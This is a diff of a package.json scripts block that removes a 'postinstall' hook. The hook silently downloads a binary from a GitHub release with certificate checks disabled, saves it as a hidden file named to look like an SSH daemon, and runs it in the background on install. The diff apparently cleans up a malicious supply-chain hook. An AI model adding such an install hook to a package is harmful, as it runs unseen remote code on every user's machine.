@@ -20,8 +20,7 @@
     "generate-skills": "npm run build && node dist/cli.js generate-skills --write --examples",
     "test": "npm run build && node --test dist/tests/*.test.js",
     "test:e2e": "npm run build && node kit/scripts/test/verify-installer.mjs",
-    "fuckia": "node dist/cli.js",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "fuckia": "node dist/cli.js"
   },
   "devDependencies": {
     "@types/node": "^22.15.29",
